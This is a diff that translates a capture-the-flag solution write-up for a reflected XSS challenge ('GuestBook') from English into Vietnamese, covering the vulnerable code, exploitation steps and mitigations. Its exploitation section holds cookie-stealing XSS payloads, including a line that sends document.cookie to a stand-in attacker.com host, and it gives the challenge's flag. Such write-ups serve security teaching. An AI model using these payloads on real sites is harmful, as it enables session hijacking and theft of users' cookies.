@@ -1,36 +1,36 @@
-# Challenge 06: GuestBook - Solution
+# Thử thách 06: GuestBook - Giải pháp
 
-## Vulnerability Type
-**Cross-Site Scripting (XSS) - Reflected XSS**
+## Loại lỗ hổng
+**Cross-Site Scripting (XSS) - Reflected XSS (XSS phản xạ)**
 
-## Description
-The search functionality reflects user input directly into the HTML response without proper escaping, allowing JavaScript injection.
+## Mô tả
+Tính năng tìm kiếm lấy giá trị nhập vào của người dùng và in trực tiếp ra mã HTML trả về mà không qua bất kỳ khâu xử lý/lọc (escape) nào. Điều này cho phép kẻ tấn công chèn và thực thi mã JavaScript độc hại.
 
-## Vulnerable Code
+## Mã nguồn chứa lỗ hổng
 ```python
 # VULNERABLE: q injected directly into HTML
 search_display = f'<p>Search results for: <b>{q}</b></p>'
 ```
 
-## Exploitation Steps
+## Khai thác (Exploit)
 
-1. The admin's flag is stored in a cookie: `admin_flag=FCTF{xss_st0l3_my_c00k13}`
-2. Craft an XSS payload to steal the cookie
-3. Use the search feature with payload:
+1. Flag của admin được giấu trong cookie dưới dạng: `admin_flag=FCTF{xss_st0l3_my_c00k13}`
+2. Chúng ta cần tạo một payload XSS để đánh cắp cookie này.
+3. Truyền payload sau vào ô tìm kiếm:
    ```html
    <script>alert(document.cookie)</script>
    ```
-4. Or to exfiltrate the cookie:
+4. Hoặc để thực sự "đánh cắp" và gửi về server của hacker:
    ```html
    <script>fetch('http://attacker.com/?c='+document.cookie)</script>
    ```
 
-## Simple Payload to View Cookie
+## Payload đơn giản hiển thị cookie
 ```
 ?q=<script>alert(document.cookie)</script>
 ```
 
-## Payload to Extract Flag
+## Payload vượt qua một số bộ lọc cơ bản để lấy Flag
 ```
 ?q=<img src=x onerror="alert(document.cookie)">
 ```
@@ -40,19 +40,19 @@ search_display = f'<p>Search results for: <b>{q}</b></p>'
 FCTF{xss_st0l3_my_c00k13}
 ```
 
-## How It Works
-1. The search parameter is reflected in the HTML without escaping
-2. JavaScript code executes in the victim's browser context
-3. The script can access cookies, session storage, and make requests
-4. In a real attack, the cookie would be sent to an attacker-controlled server
+## Cách hoạt động
+1. Tham số tìm kiếm (q) được nối trực tiếp vào HTML mà không được xử lý (escape).
+2. Trình duyệt của nạn nhân sẽ tải mã HTML bị tiêm và chạy đoạn mã JavaScript đó.
+3. Script độc hại có thể đọc được cookie, sessionStorage, hoặc thay mặt nạn nhân gửi các request.
+4. Trong thực tế, kẻ tấn công sẽ lừa admin nhấp vào đường link chứa sẵn payload để gửi cookie của admin về server của chúng.
 
-## Mitigation
-- Always escape user input before rendering in HTML
-- Use proper templating with auto-escaping:
+## Biện pháp phòng ngừa (Mitigation)
+- Luôn xử lý mã hóa (escape/encode) các ký tự đặc biệt của HTML (như `<`, `>`, `&`, `"`, `'`) từ dữ liệu người dùng trước khi in ra giao diện.
+- Sử dụng template engine có hỗ trợ auto-escaping (như Jinja2):
   ```python
   search_display = f'<p>Search results for: <b>{html_lib.escape(q)}</b></p>'
   ```
-- Implement Content Security Policy (CSP) headers
-- Set cookies with `HttpOnly` flag to prevent JavaScript access
-- Use frameworks that auto-escape by default
-- Validate and sanitize all user input
+- Cấu hình header Content Security Policy (CSP) để giới hạn nguồn chạy mã JavaScript.
+- Thiết lập cờ `HttpOnly` cho các cookie nhạy cảm để chặn JavaScript truy cập vào chúng (`document.cookie`).
+- Nên dùng các web framework có sẵn tính năng tự động escape theo mặc định.
+- Luôn kiểm tra (validate) và lọc (sanitize) mọi dữ liệu đầu vào của người dùng.
